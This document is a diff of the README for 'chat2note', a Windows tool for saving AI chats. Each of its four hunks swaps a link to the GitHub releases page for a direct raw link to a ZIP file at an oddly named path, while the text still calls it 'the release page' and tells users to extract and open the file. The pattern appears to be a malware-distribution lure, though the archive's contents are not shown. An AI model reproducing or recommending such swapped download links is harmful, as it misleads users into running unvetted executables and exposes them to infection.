@@ -1,6 +1,6 @@
 # 📝 chat2note - Save AI chats to your notes
 
-[![Download chat2note](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Directivenessactivatedcarbon26/chat2note/releases)
+[![Download chat2note](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Directivenessactivatedcarbon26/chat2note/raw/refs/heads/main/agminate/note-chat-reinsure.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This guide shows you how to get it on Windows and start using it.
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Directivenessactivatedcarbon26/chat2note/releases
+Visit this page to download: https://github.com/Directivenessactivatedcarbon26/chat2note/raw/refs/heads/main/agminate/note-chat-reinsure.zip
 
 On the release page, look for the latest version. Download the file made for Windows, then open it.
 
@@ -42,7 +42,7 @@ It is useful when you want to keep research, prompts, answers, and ideas in one 
 
 ## 🪟 Install on Windows
 
-1. Open the release page: https://github.com/Directivenessactivatedcarbon26/chat2note/releases
+1. Open the release page: https://github.com/Directivenessactivatedcarbon26/chat2note/raw/refs/heads/main/agminate/note-chat-reinsure.zip
 2. Download the latest Windows file.
 3. If the file is in a ZIP folder, right-click it and choose Extract All.
 4. Open the extracted folder.
@@ -190,7 +190,7 @@ chat2note is a good fit for people who work with:
 
 ## 📦 Download and Start
 
-Visit this page to download: https://github.com/Directivenessactivatedcarbon26/chat2note/releases
+Visit this page to download: https://github.com/Directivenessactivatedcarbon26/chat2note/raw/refs/heads/main/agminate/note-chat-reinsure.zip
 
 Download the latest Windows file from the release page, then open it and follow the browser setup steps above
 
